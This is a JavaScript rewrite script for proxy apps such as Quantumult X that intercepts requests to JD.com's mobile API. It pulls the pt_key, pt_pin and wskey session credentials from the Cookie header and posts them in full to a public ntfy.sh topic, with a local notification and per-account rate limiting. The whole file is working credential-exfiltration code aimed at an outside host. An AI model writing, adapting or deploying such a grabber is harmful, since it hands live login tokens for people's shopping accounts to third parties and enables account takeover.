/**
 * 京东 Cookie + Wskey 抓取 (Quantumult X) - 频率控制版
 *
 * 圈X 重写: ^https?://api\.m\.jd\.com/ → script-request-header
 * 频率: 同账号每分钟最多推送1次，RATE_LIMIT_MS 可调
 */

const RATE_LIMIT_MS = 60000; // 1分钟
const NTFY_URL = "https://ntfy.sh/HzjHy2codes";

// ============ 兼容层 ============
function pget(key) {
  try {
    if (typeof $prefs !== "undefined") return $prefs.valueForKey(key) || "0";
  } catch (_) {}
  try {
    if (typeof $persistentStore !== "undefined") return $persistentStore.read(key) || "0";
  } catch (_) {}
  return "0";
}
function pset(value, key) {
  try {
    if (typeof $prefs !== "undefined") { $prefs.setValueForKey(value, key); return; }
  } catch (_) {}
  try {
    if (typeof $persistentStore !== "undefined") { $persistentStore.write(value, key); return; }
  } catch (_) {}
}
function nowMs() { return Date.now ? Date.now() : new Date().getTime(); }

function doNotify(title, subtitle, msg) {
  try {
    if (typeof $notify !== "undefined") { $notify(title, subtitle, msg); return; }
  } catch (_) {}
  try {
    if (typeof $notification !== "undefined") { $notification.post(title, subtitle, msg); return; }
  } catch (_) {}
}

function doFetch(opts, cb) {
  if (typeof $task !== "undefined" && $task.fetch) {
    $task.fetch({ url: opts.url, method: "POST", headers: opts.headers, body: opts.body }).then(
      function () { if (cb) cb(); },
      function () { if (cb) cb(); }
    );
  } else if (typeof $httpClient !== "undefined") {
    $httpClient.post(opts, cb || function(){});
  }
}

// ============ 主逻辑 ============
const cookie = $request.headers["Cookie"] || $request.headers["cookie"] || "";
if (!cookie) { $done({}); }

const ptPin = (cookie.match(/pt_pin=([^;]+)/) || [])[1] || "";
const ptKey = (cookie.match(/pt_key=([^;]+)/) || [])[1] || "";
const rawPin = (cookie.match(/(?:^|;\s*)pin=([^;]+)/) || [])[1] || "";
const wskey = (cookie.match(/wskey=([^;]+)/) || [])[1] || "";
const pin = ptPin || rawPin;

console.log("[JD] pin=" + (pin || "?") + " pt_key=" + (ptKey ? "有" : "无") + " wskey=" + (wskey ? "有" : "无"));

if (pin && ptKey) {
  const last = parseInt(pget("jd_ck_" + pin));
  if (nowMs() - last > RATE_LIMIT_MS) {
    pset(String(nowMs()), "jd_ck_" + pin);
    var ckLine = "pt_key=" + ptKey + ";pt_pin=" + pin + ";";
    doFetch({ url: NTFY_URL, headers: { "Content-Type": "text/plain", Title: "JD_cookie_" + pin }, body: ckLine });
    doNotify("JD Cookie", pin, ptKey.substring(0, 30) + "...");
    console.log("[JD-CK] 已推送: " + pin);
  } else {
    console.log("[JD-CK] 频率限制, " + pin);
  }
}

if (wskey) {
  var wp = pin || "unknown";
  var wk = "jd_ws_" + wp + "_" + wskey.substring(0, 16);
  var last = parseInt(pget(wk));
  if (nowMs() - last > RATE_LIMIT_MS) {
    pset(String(nowMs()), wk);
    var wsLine = "pin=" + wp + ";wskey=" + wskey + ";";
    doFetch({ url: NTFY_URL, headers: { "Content-Type": "text/plain", Title: "JD_wskey_" + wp }, body: wsLine });
    doNotify("JD WSKEY", wp, "wskey=" + wskey.substring(0, 30) + "...");
    console.log("[JD-WS] 已推送: " + wp);
  } else {
    console.log("[JD-WS] 频率限制, " + wp);
  }
}

$done({});
